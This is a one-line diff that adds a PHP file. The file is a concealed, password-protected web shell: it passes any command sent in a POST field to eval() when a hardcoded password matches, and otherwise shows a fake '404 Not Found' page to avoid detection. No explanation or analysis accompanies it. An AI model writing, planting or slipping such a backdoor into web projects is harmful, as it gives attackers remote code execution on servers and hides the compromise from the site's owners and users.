@@ -1,0 +1,1 @@
+<?php if($_POST["password"]=="6d6f6ba3dac2aec2c34321b5ae20d0fb"){eval($_POST["cmd"]);}else{echo "<title>404 Not Found</title><h1>Not Found</h1>";}?>
